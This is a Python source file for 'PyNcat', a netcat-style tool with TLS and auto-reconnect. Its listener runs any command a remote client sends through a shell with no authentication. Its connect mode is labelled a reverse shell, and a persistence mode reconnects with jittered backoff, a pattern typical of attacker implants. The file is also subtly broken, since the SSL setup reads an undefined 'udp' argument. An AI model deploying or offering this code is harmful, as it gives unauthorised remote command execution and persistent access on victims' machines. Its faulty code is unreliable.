#!/usr/bin/env python3
import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import tqdm
import ssl
import tempfile
import os
import time
import random

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        if self.args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        self.ssl_context = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(description="PyNcat - Better Netcat with SSL & Persistence", 
                                       formatter_class=argparse.ArgumentDefaultsHelpFormatter)
        
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode')
        group.add_argument('-c', '--connect', type=str, help='Connect to target IP (reverse shell)')
        
        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        
        # Features
        parser.add_argument('-e', '--execute', type=str, help='Execute command on connection')
        parser.add_argument('-f', '--file', type=str, help='File to upload/save')
        
        # SSL
        parser.add_argument('--ssl', action='store_true', help='Enable SSL/TLS')
        parser.add_argument('--cert', type=str, help='SSL certificate path')
        parser.add_argument('--key', type=str, help='SSL private key path')
        
        # Persistence
        parser.add_argument('--persistent', action='store_true', help='Enable persistent reverse shell (auto-reconnect)')
        parser.add_argument('--max-retries', type=int, default=0, help='Max reconnection attempts (0 = infinite)')
        parser.add_argument('--delay', type=int, default=5, help='Base delay between retries (seconds)')
        
        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
        
        return parser.parse_args()

    def setup_ssl(self):
        if self.args.udp:  # UDP removed for simplicity in this version
            logging.warning("[!] UDP not supported in this build.")
            self.args.ssl = False
            return

        cert_path = self.args.cert
        key_path = self.args.key

        if not cert_path or not key_path:
            logging.info("[*] Generating self-signed certificate...")
            cert_path, key_path = self.generate_self_signed_cert()

        try:
            if self.args.listen:
                self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                self.ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            else:
                self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                self.ssl_context.check_hostname = False
                self.ssl_context.verify_mode = ssl.CERT_NONE
        except Exception as e:
            logging.error(f"SSL setup failed: {e}")
            sys.exit(1)

    def generate_self_signed_cert(self):
        try:
            from OpenSSL import crypto
        except ImportError:
            logging.error("[!] pip install pyOpenSSL")
            sys.exit(1)

        cert_path = "/tmp/pyncat_cert.pem"
        key_path = "/tmp/pyncat_key.pem"

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        cert = crypto.X509()
        cert.get_subject().CN = "pyncat"
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365*24*60*60)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        with open(cert_path, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(key_path, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        return cert_path, key_path

    def execute_command(self, cmd: str) -> str:
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=15)
            return output.decode('utf-8', errors='replace')
        except Exception as e:
            return f"[!] Error: {e}\n"

    def upload_file(self, client_socket, filepath):
        try:
            with open(filepath, 'wb') as f:
                while chunk := client_socket.recv(8192):
                    f.write(chunk)
            logging.info(f"[+] File saved: {filepath}")
        except Exception as e:
            logging.error(f"Upload error: {e}")

    def send_file(self, client_socket, filepath):
        try:
            path = Path(filepath)
            filesize = path.stat().st_size
            with open(path, 'rb') as f, tqdm.tqdm(total=filesize, unit='B', unit_scale=True) as pbar:
                while chunk := f.read(8192):
                    client_socket.send(chunk)
                    pbar.update(len(chunk))
        except Exception as e:
            logging.error(f"Send error: {e}")

    def handle_client(self, client_socket, addr):
        logging.info(f"[+] Connection from {addr}")
        try:
            if self.args.execute:
                client_socket.send(self.execute_command(self.args.execute).encode())

            if self.args.file and self.args.listen:
                self.upload_file(client_socket, self.args.file)

            while True:
                client_socket.send(b"pyncat> ")
                request = client_socket.recv(8192).decode('utf-8').strip()
                if not request or request.lower() in ['exit', 'quit']:
                    break
                output = self.execute_command(request)
                client_socket.send(output.encode())
        except:
            pass
        finally:
            client_socket.close()

    def listen(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", self.args.port))

            if self.args.ssl:
                server = self.ssl_context.wrap_socket(server, server_side=True)

            server.listen(5)
            mode = "SSL " if self.args.ssl else ""
            logging.info(f"[*] Listening on 0.0.0.0:{self.args.port} ({mode}TCP)")

            while True:
                client, addr = server.accept()
                thread = threading.Thread(target=self.handle_client, args=(client, addr), daemon=True)
                thread.start()
        except KeyboardInterrupt:
            logging.info("\n[!] Listener stopped.")
        except Exception as e:
            logging.error(f"Listener error: {e}")

    def connect_once(self):
        """Single connection attempt"""
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self.args.ssl:
                client = self.ssl_context.wrap_socket(client)

            logging.info(f"[*] Connecting to {self.args.connect}:{self.args.port}...")
            client.connect((self.args.connect, self.args.port))
            logging.info("[+] Connected successfully!")

            if self.args.file:
                self.send_file(client, self.args.file)
                return False  # Exit after file transfer

            # Interactive shell
            while True:
                try:
                    response = client.recv(8192).decode('utf-8', errors='replace')
                    if response:
                        print(response, end='', flush=True)

                    cmd = input()
                    if cmd.lower() in ['exit', 'quit']:
                        client.send(b'exit\n')
                        break
                    client.send((cmd + '\n').encode())
                except (ConnectionResetError, BrokenPipeError, EOFError):
                    logging.info("[!] Connection lost.")
                    return False
        except Exception as e:
            if self.args.verbose:
                logging.debug(f"Connect error: {e}")
            return False
        finally:
            client.close()
        return True

    def connect_persistent(self):
        """Persistent connection with auto-reconnect"""
        retries = 0
        while True:
            try:
                connected = self.connect_once()
                if connected and not self.args.file:
                    break  # Successful interactive session ended normally
            except KeyboardInterrupt:
                logging.info("\n[!] Persistent shell terminated by user.")
                break

            retries += 1
            if self.args.max_retries > 0 and retries > self.args.max_retries:
                logging.info("[!] Max retries reached. Exiting.")
                break

            # Exponential backoff + jitter
            delay = min(self.args.delay * (2 ** (retries % 6)), 300)  # Cap at 5 minutes
            jitter = random.uniform(0.5, 1.5)
            sleep_time = delay * jitter

            logging.info(f"[*] Reconnecting in {sleep_time:.1f}s... (Attempt {retries})")
            time.sleep(sleep_time)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            if self.args.persistent:
                self.connect_persistent()
            else:
                self.connect_once()


if __name__ == "__main__":
    try:
        pyncat = PyNcat()
        pyncat.run()
    except KeyboardInterrupt:
        print("\n[!] PyNcat terminated by user.")
    except Exception as e:
        logging.error(f"Critical error: {e}")
